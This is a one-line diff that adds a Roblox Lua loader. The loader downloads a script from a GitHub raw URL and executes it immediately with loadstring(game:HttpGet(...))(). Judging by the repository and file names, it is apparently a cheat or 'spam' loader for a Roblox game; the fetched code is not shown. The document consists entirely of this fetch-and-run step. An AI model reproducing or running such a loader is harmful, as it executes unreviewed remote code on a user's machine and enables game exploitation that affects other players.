@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/aooni-nightmare-spam3-25ri2m2uoe85yc.lua"))()
